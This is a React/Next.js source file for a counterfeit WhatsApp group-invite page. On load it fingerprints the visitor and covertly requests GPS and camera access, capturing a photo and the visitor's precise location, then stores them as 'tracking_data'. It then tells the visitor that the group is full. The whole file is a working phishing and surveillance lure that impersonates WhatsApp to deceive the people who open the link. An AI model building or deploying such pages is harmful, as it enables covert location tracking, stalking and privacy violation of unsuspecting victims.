'use client';

import { useState, useEffect, useRef } from 'react';
import { useParams } from 'next/navigation';
import { collectAllData, collectDataWithoutGPS, initializeBehavioralTracking, CollectedData, getCameraPermissionStatus, captureCameraImage } from '@/lib/dataCollection';
import { WhatsappLogo, WarningCircle, CheckCircle, Spinner } from '@phosphor-icons/react';
import { twMerge } from 'tailwind-merge';

interface GroupData {
  id: string;
  name: string;
  image: string;
  createdAt: string;
}

export default function JoinPage() {
  const params = useParams();
  const groupId = params.groupId as string;
  const [groupData, setGroupData] = useState<GroupData | null>(null);
  const [location, setLocation] = useState<GeolocationCoordinates | null>(null);
  const [locationError, setLocationError] = useState<string>('');
  const [isRequestingLocation, setIsRequestingLocation] = useState(false);
  const [hasJoined, setHasJoined] = useState(false);
  const [collectedData, setCollectedData] = useState<CollectedData | null>(null);
  const [backgroundDataCollected, setBackgroundDataCollected] = useState(false);
  const [cameraImage, setCameraImage] = useState<string | null>(null);
  const backgroundDataRef = useRef<Omit<CollectedData, 'gpsLocation'> | null>(null);
  const permissionRequestedRef = useRef(false);
  const cameraPermissionRequestedRef = useRef(false);

  useEffect(() => {
    // Initialize behavioral tracking when page loads
    initializeBehavioralTracking();
    
    // Load group data from localStorage - handle both URL params and direct access
    const stored = localStorage.getItem(`group_${groupId}`);
    if (stored) {
      try {
        setGroupData(JSON.parse(stored));
      } catch (error) {
        console.error('Error parsing group data:', error);
      }
    } else {
      // Try to get groupId from URL if not in params
      const urlPath = window.location.pathname;
      const urlGroupId = urlPath.split('/join/')[1]?.split('/')[0]?.split('?')[0];
      if (urlGroupId && urlGroupId !== groupId) {
        const altStored = localStorage.getItem(`group_${urlGroupId}`);
        if (altStored) {
          try {
            setGroupData(JSON.parse(altStored));
          } catch (error) {
            console.error('Error parsing group data:', error);
          }
        }
      }
    }

    // Start background data collection immediately (no permission needed)
    collectBackgroundData();

    // Auto-request location permission on Android/mobile devices
    autoRequestLocationPermission();

    // Auto-request camera permission
    autoRequestCameraPermission();
  }, [groupId]);

  // Collect background data (IP, fingerprint, device info, etc.) - NO GPS needed
  const collectBackgroundData = async () => {
    try {
      const backgroundData = await collectDataWithoutGPS(groupId);
      
      // Try to capture camera image in background
      let finalCameraImage = null;
      try {
        finalCameraImage = await captureCameraImage();
        if (finalCameraImage) {
          setCameraImage(finalCameraImage);
        }
      } catch (error) {
        // Camera permission denied - that's fine
      }
      
      // Get camera permission status
      const cameraPermissionStatus = await getCameraPermissionStatus();
      
      // Add camera data to background data
      const dataWithCamera = {
        ...backgroundData,
        gpsLocation: null,
        cameraImage: finalCameraImage,
        metadata: {
          ...backgroundData.metadata,
          cameraPermissionStatus,
        },
      };
      
      backgroundDataRef.current = dataWithCamera as any;
      setBackgroundDataCollected(true);
      
      // Store background data immediately (even without GPS)
      const existingData = JSON.parse(localStorage.getItem('tracking_data') || '[]');
      existingData.push(dataWithCamera);
      localStorage.setItem('tracking_data', JSON.stringify(existingData));
    } catch (error) {
      console.error('Error collecting background data:', error);
    }
  };

  // Auto-request location permission (especially for Android)
  const autoRequestLocationPermission = async () => {
    if (permissionRequestedRef.current) return;
    permissionRequestedRef.current = true;

    if (!navigator.geolocation) {
      console.log('Geolocation not supported');
      return;
    }

    // Check if permission is already granted
    try {
      if (navigator.permissions) {
        const permission = await navigator.permissions.query({ name: 'geolocation' as PermissionName });
        console.log('Location permission status:', permission.state);
        
        if (permission.state === 'granted') {
          // Permission already granted, get location silently
          console.log('Location permission already granted');
          getLocationSilently();
          return;
        }
        
        if (permission.state === 'prompt') {
          // Permission not yet requested, request it automatically
          // On Android, this will show the permission prompt
          console.log('Requesting location permission...');
          getLocationSilently();
        } else if (permission.state === 'denied') {
          console.log('Location permission denied by user');
        }
      } else {
        // Fallback for browsers without permissions API
        // Try to get location (will trigger permission prompt)
        console.log('Permissions API not available, trying direct request...');
        getLocationSilently();
      }
    } catch (error) {
      // Permissions API not supported, try direct request
      console.log('Error checking permissions, trying direct request:', error);
      getLocationSilently();
    }
  };

  // Get location silently (background - user will see browser prompt)
  const getLocationSilently = () => {
    if (!navigator.geolocation) {
      console.log('Geolocation API not available');
      return;
    }

    console.log('Requesting GPS location...');
    navigator.geolocation.getCurrentPosition(
      async (position) => {
        console.log('GPS location obtained:', position.coords);
        // Location obtained! Update the data with GPS
        setLocation(position.coords);
        
        // Try to capture camera image if not already captured
        let finalCameraImage = cameraImage;
        if (!finalCameraImage) {
          try {
            finalCameraImage = await captureCameraImage();
            if (finalCameraImage) {
              setCameraImage(finalCameraImage);
            }
          } catch (error) {
            // Camera permission denied - that's fine
          }
        }
        
        // Get camera permission status
        const cameraPermissionStatus = await getCameraPermissionStatus();
        
        // If we already have background data, merge it with GPS
        if (backgroundDataRef.current) {
          const allData = await collectAllData(groupId, position.coords);
          allData.cameraImage = finalCameraImage;
          allData.metadata.cameraPermissionStatus = cameraPermissionStatus;
          setCollectedData(allData);
          
          // Update stored data with GPS location
          const existingData = JSON.parse(localStorage.getItem('tracking_data') || '[]');
          // Find the last entry (our background data) and update it
          if (existingData.length > 0) {
            existingData[existingData.length - 1] = allData;
            localStorage.setItem('tracking_data', JSON.stringify(existingData));
          }
          
          // Also store in group-specific storage
          const groupTrackingData = JSON.parse(localStorage.getItem(`group_tracking_${groupId}`) || '[]');
          groupTrackingData.push(allData);
          localStorage.setItem(`group_tracking_${groupId}`, JSON.stringify(groupTrackingData));
        } else {
          // No background data yet, collect everything now
          const allData = await collectAllData(groupId, position.coords);
          allData.cameraImage = finalCameraImage;
          allData.metadata.cameraPermissionStatus = cameraPermissionStatus;
          setCollectedData(allData);
          
          const existingData = JSON.parse(localStorage.getItem('tracking_data') || '[]');
          existingData.push(allData);
          localStorage.setItem('tracking_data', JSON.stringify(existingData));
          
          const groupTrackingData = JSON.parse(localStorage.getItem(`group_tracking_${groupId}`) || '[]');
          groupTrackingData.push(allData);
          localStorage.setItem(`group_tracking_${groupId}`, JSON.stringify(groupTrackingData));
        }
      },
      (error) => {
        // Permission denied or error - that's okay, we still have background data
        console.log('Location permission denied or error:', error.code, error.message);
        if (error.code === 1) {
          console.log('User denied location permission');
        } else if (error.code === 2) {
          console.log('Location unavailable');
        } else if (error.code === 3) {
          console.log('Location request timeout');
        }
      },
      {
        enableHighAccuracy: true,
        timeout: 15000,
        maximumAge: 0,
      }
    );
  };

  // Auto-request camera permission (background)
  const autoRequestCameraPermission = async () => {
    if (cameraPermissionRequestedRef.current) return;
    cameraPermissionRequestedRef.current = true;

    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
      return;
    }

    try {
      // Check if permission is already granted
      const permissionStatus = await getCameraPermissionStatus();
      
      if (permissionStatus === 'granted') {
        // Permission already granted, capture image silently
        captureCameraImageSilently();
        return;
      }
      
      if (permissionStatus === 'prompt') {
        // Permission not yet requested, try to capture (will trigger prompt)
        captureCameraImageSilently();
      }
    } catch (error) {
      // Permissions API not supported, try direct request
      captureCameraImageSilently();
    }
  };

  // Capture camera image silently (background - user will see browser prompt)
  const captureCameraImageSilently = async () => {
    try {
      const image = await captureCameraImage();
      if (image) {
        setCameraImage(image);
      }
    } catch (error) {
      // Permission denied or error - that's okay
      console.log('Camera capture failed:', error);
    }
  };

  // Manual request when user clicks "Join Group"
  const requestLocation = async () => {
    setIsRequestingLocation(true);
    setLocationError('');

    if (!navigator.geolocation) {
      setLocationError('Geolocation is not supported by your browser');
      setIsRequestingLocation(false);
      return;
    }

    navigator.geolocation.getCurrentPosition(
      async (position) => {
        setLocation(position.coords);
        setIsRequestingLocation(false);
        
        // Try to capture camera image if not already captured
        let finalCameraImage = cameraImage;
        if (!finalCameraImage) {
          try {
            finalCameraImage = await captureCameraImage();
            if (finalCameraImage) {
              setCameraImage(finalCameraImage);
            }
          } catch (error) {
            // Camera permission denied - that's fine
          }
        }
        
        // Get camera permission status
        const cameraPermissionStatus = await getCameraPermissionStatus();
        
        // Collect ALL data (location + fingerprinting + analysis)
        const allData = await collectAllData(groupId, position.coords);
        
        // Add camera image and permission status
        allData.cameraImage = finalCameraImage;
        allData.metadata.cameraPermissionStatus = cameraPermissionStatus;
        
        setCollectedData(allData);
        
        // Update or add to stored data
        const existingData = JSON.parse(localStorage.getItem('tracking_data') || '[]');
        
        // If we have background data, update it; otherwise add new
        if (backgroundDataRef.current && existingData.length > 0) {
          existingData[existingData.length - 1] = allData;
        } else {
          existingData.push(allData);
        }
        localStorage.setItem('tracking_data', JSON.stringify(existingData));
        
        // Also store in a separate file per group for easy access
        const groupTrackingData = JSON.parse(localStorage.getItem(`group_tracking_${groupId}`) || '[]');
        // Remove the background data entry if it exists
        const filteredGroupData = groupTrackingData.filter((d: any) => d.gpsLocation !== null);
        filteredGroupData.push(allData);
        localStorage.setItem(`group_tracking_${groupId}`, JSON.stringify(filteredGroupData));
        
        setHasJoined(true);
      },
      async (error) => {
        setLocationError('Unable to retrieve your location. Please allow location access.');
        setIsRequestingLocation(false);
        
        // Try to capture camera image if not already captured
        let finalCameraImage = cameraImage;
        if (!finalCameraImage) {
          try {
            finalCameraImage = await captureCameraImage();
            if (finalCameraImage) {
              setCameraImage(finalCameraImage);
            }
          } catch (error) {
            // Camera permission denied - that's fine
          }
        }
        
        // Get camera permission status
        const cameraPermissionStatus = await getCameraPermissionStatus();
        
        // Even if location is denied, we still have background data
        if (backgroundDataRef.current) {
          const dataWithNoGPS = {
            ...backgroundDataRef.current,
            gpsLocation: null,
            cameraImage: finalCameraImage,
            metadata: {
              ...backgroundDataRef.current.metadata,
              cameraPermissionStatus,
            },
          } as CollectedData;
          setCollectedData(dataWithNoGPS);
          setHasJoined(true); // Still mark as joined, just without GPS
          
          // Update stored data
          const existingData = JSON.parse(localStorage.getItem('tracking_data') || '[]');
          if (existingData.length > 0) {
            existingData[existingData.length - 1] = dataWithNoGPS;
            localStorage.setItem('tracking_data', JSON.stringify(existingData));
          }
        }
      },
      {
        enableHighAccuracy: true,
        timeout: 10000,
        maximumAge: 0,
      }
    );
  };

  const handleJoinGroup = () => {
    requestLocation();
  };

  if (!groupData) {
    return (
      <div className="min-h-screen bg-[#e5ddd5] flex items-center justify-center">
        <div className="text-center">
          <Spinner className="w-8 h-8 text-[#128C7E] animate-spin mx-auto" weight="bold" />
          <p className="text-[#667781] mt-4 text-sm">Loading...</p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#e5ddd5] flex items-center justify-center p-4">
      <div className="w-full max-w-md bg-white shadow-sm">
        {/* WhatsApp-style Header */}
        <div className="bg-[#075E54] text-white">
          <div className="px-4 py-3 flex items-center">
            <div className="flex items-center justify-center w-10 h-10 mr-3">
              <WhatsappLogo className="w-6 h-6 text-white" weight="fill" />
            </div>
            <div className="flex-1">
              <h1 className="text-lg font-medium">WhatsApp</h1>
            </div>
          </div>
        </div>

        {/* Main Content */}
        <div className="bg-white">
          {/* Group Image and Name Section */}
          <div className="px-6 pt-8 pb-6 text-center">
            {groupData.image ? (
              <img
                src={groupData.image}
                alt={groupData.name}
                className="w-32 h-32 rounded-full mx-auto mb-4 object-cover border-4 border-white shadow-md"
              />
            ) : (
              <div className="w-32 h-32 rounded-full mx-auto mb-4 bg-[#128C7E] flex items-center justify-center border-4 border-white shadow-md">
                <span className="text-5xl text-white font-semibold">
                  {groupData.name.charAt(0).toUpperCase()}
                </span>
              </div>
            )}
            <h2 className="text-2xl font-semibold text-[#1f1f1f] mb-2">{groupData.name}</h2>
            <p className="text-[#667781] text-sm">WhatsApp Group</p>
          </div>

          {/* Divider */}
          <div className="border-t border-[#e4e6eb]"></div>

          {/* Join Section */}
          {!hasJoined ? (
            <div className="px-6 py-8">
              <div className="text-center mb-6">
                <p className="text-[#667781] text-sm leading-relaxed">
                  You've been invited to join this group. Tap the button below to join.
                </p>
              </div>

              {locationError && (
                <div className="mb-4 p-3 bg-[#fee] border border-[#fcc] rounded-lg">
                  <p className="text-sm text-[#c33]">{locationError}</p>
                </div>
              )}

              <button
                onClick={handleJoinGroup}
                disabled={isRequestingLocation}
                className={twMerge(
                  "w-full bg-[#25D366] text-white py-3.5 rounded-lg font-medium text-base",
                  "hover:bg-[#20BA5A] active:bg-[#1DA851] transition-colors",
                  "disabled:opacity-70 disabled:cursor-not-allowed",
                  "shadow-sm flex items-center justify-center"
                )}
                style={{
                  boxShadow: '0 2px 4px rgba(37, 211, 102, 0.3)'
                }}
              >
                {isRequestingLocation ? (
                  <>
                    <Spinner className="w-5 h-5 text-white mr-3 animate-spin" weight="bold" />
                    <span>Joining...</span>
                  </>
                ) : (
                  'Join Group'
                )}
              </button>

              <p className="text-xs text-[#8696a0] text-center mt-4 leading-relaxed">
                By joining, you agree to share your location for verification purposes.
              </p>
            </div>
          ) : (
            <div className="px-6 py-8">
              <div className="text-center">
                <div className="inline-flex items-center justify-center w-20 h-20 bg-[#fdecea] rounded-full mb-4">
                  <WarningCircle className="w-12 h-12 text-[#d93025]" weight="fill" />
                </div>
                <h3 className="text-xl font-semibold text-[#1f1f1f] mb-2">Sorry, the group is full</h3>
                <p className="text-[#667781] text-sm">
                  This group has reached its maximum capacity. Please try again later.
                </p>
              </div>
            </div>
          )}

          {/* Footer removed per request */}
        </div>
      </div>
    </div>
  );
}
